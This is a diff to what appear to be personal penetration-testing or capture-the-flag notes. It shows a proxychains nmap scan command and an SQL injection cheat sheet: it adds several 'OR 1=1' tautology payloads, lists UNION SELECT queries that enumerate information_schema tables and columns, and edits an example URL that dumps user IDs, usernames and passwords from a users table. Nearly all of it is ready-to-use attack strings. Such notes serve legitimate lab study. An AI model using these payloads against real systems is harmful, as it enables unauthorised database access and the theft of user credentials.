@@ -818,12 +818,15 @@ proxychains nmap -v -sT -Pn -T4 -sV --script=http-enum.nse <found IPs> -p80
 SET UP A WEB TUNNEL TO THE .181 WEBSITE
 
 SQL injection
+Selection=2 OR 1=1
+Selection=2 OR 1=1;
+Selection=2 OR 1=1;#
 product=2 OR 1=1(;) add the semi-colon or not to see if the sql can give more information then intended
 UNION SELECT 1,table_name,3 FROM information_schema.tables (add more columns in case there will be more than 3 columns EX: ( 1,table_name,3,4,5 )
 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
 UNION SELECT table_name,1,column_name FROM information_schema.columns
 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
-EX: pick.php?/product=7 UNION SELECT userid,username,passwd FROM users
+EX: pick.php?/product=7 UNION SELECT userid,username,passwd FROM siteusers.users
 
 SQL Questions 
 DATABASES are the first column aka information_schema.columns
